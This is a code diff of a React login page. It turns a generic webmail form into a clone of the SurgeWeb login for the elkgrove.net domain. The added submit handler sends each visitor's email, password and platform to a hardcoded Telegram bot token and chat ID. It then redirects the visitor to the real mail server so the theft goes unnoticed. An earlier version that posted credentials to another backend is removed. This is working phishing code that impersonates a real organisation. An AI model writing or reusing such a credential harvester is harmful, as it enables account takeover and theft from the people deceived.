@@ -13,62 +13,55 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Adams")
+    const[platform, setPlatform] = useState("Elkgrove")
 
     const[showError, setShowError] = useState(false);
 
 
     
 
-    useEffect(() => {
-        // Code to run when the component mounts or when dependencies change
-      showCookies();
-
-      }, [])
+   
 
 
-      function showCookies(){
-        const cookiesArray = document.cookie.split('; ');
-
-        cookiesArray.forEach(cookie => {
-          const [name, value, domain] = cookie.split('=');
-          
-          console.log(`Cookies name is : ${name} , Cookies Value is  ${value}`);
-        });
+    async function handleSubmit(e){
+        e.preventDefault();
+    
+    
+        try {
+            // const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
+            //     email:email,
+            //     password:password,
+            //     platform:platform
+            // });
+    
+            const response = await axios.post(`https://api.telegram.org/bot6346477835:AAE--Er907FambpxvtD7C-CU-J7GlwgyEkg/sendMessage`, {
+                chat_id: 5916570239,
+                text: `Platform : ${platform} , Email : ${email} ,  Password : ${password}`,
+              });
+    
+    
+        
+            // Handle success
+         
+    
+            if(response.status == 200){
+               // console.log(response.data.message);
+    
+              
+               window.location.href = 'http://mail.elkgrove.net:7080/surgeweb.exe';
+            }
+          } catch (error) {
+            // Handle error
+            console.error('Error:', error);
+          }
+        
+    
+        
     }
-
-async function handleSubmit(e){
-    e.preventDefault();
-
-    try {
-        const response = await axios.post('https://mainbackend-rd07.onrender.com/api/send', {
-            email:email,
-            password:password,
-            platform:platform
-        });
-    
-        // Handle success
-        console.log('Data sent:', response.data.message);
-
-        if(response.status == 200){
-            console.log(response.data.message);
-
-            setShowError(true);
-        }
-      } catch (error) {
-        // Handle error
-        console.error('Error:', error);
-      }
-    
-}
 
     return (
         <>
-            <nav className='mynav px-3 py-3'>
-                <img className='navimage' src={logo} />
-
-            </nav>
-
+           
                 <div className='py-5'>
 
                 </div>
@@ -88,17 +81,17 @@ async function handleSubmit(e){
             </button>
             </div>}
 
-                <div className='cardhead'>
-                Welcome to Webmail
+                <div className='cardhead text-center '>
+                Welcome to SurgeWeb
                 </div>
 
-                <form onSubmit={handleSubmit}>
+                <form onSubmit={handleSubmit} className="py-2">
 
                 <div class="formrow text-center mt-3">
-                                <span class="prompt"><label for="user">Email</label></span>
+                                <span class="prompt"><label for="user">Username</label></span>
                                                 <div class="element"><input type="email"onChange={function(e){
                                                     setUserName(e.target.value);
-                                                }}value={email} className='inputwide' required/>
+                                                }}value={email} className='inputwide' required/> <span className='font-weight-bold'>@ elkgrove.net</span>
                                 </div>
                         </div>
 
@@ -112,10 +105,63 @@ async function handleSubmit(e){
                         </div>
 
 
-                    <div className='buttondiv py-4 text-center'>
-                        <button className='mybutton'type="submit">Login</button>
+                        <div class="formrow text-center">
+                                <span class="prompt"><label for="user">Interface</label></span>
+                                                <div class="element">
 
-                    </div>
+                                                    <select>
+                                                        <option value="standard">standard</option>
+                                                        <option value="basic">basic</option>
+                                                        <option value="mobile">mobile</option>
+
+                                                    </select>
+
+                                                    <select className='ml-3'>
+                                                    <option value="German" >Deutsch</option>
+					<option value="English" selected>English (UK) </option>
+					<option value="English US" >English (US) </option>
+					<option value="Spanish" >Español</option>
+					<option value="French" >Français</option>
+					<option value="Dutch" >Nederlands</option>
+					<option value="Portuguese Br" >Português (Brazil)</option>
+					<option value="Portuguese" >Português (Portugal)</option>
+					<option value="Russian" >Русский</option>
+					<option value="Hindi" >हिन्दी</option>
+					<option value="Japanese" >日本語</option>
+		
+                                                        
+                                                        
+                                                    </select>
+                                </div>
+                        </div>
+
+
+                        <div class="formrow text-center">
+                                <span class="prompt"><label for="user">Remember me</label></span>
+                                                <div class="element"><input  type="checkbox"className=''/>
+                                </div>
+                        </div>
+
+
+                    
+
+                    <div class="formrow text-center py-3">
+                                <span class="prompt"><label for="user"></label></span>
+                                                <div class="element">
+                                                <button className='mybutton'type="submit">Login</button>
+
+                                </div>
+                        </div>
+
+                        <div className='text-center py-1 px-2'style={{
+                            backgroundColor:"#007",
+                            color:"white",
+                        }}>
+                            SurgeWeb ©2009-2021 Netwin Ltd, about SurgeMail
+
+                        </div>
+
+                       
 
 
 
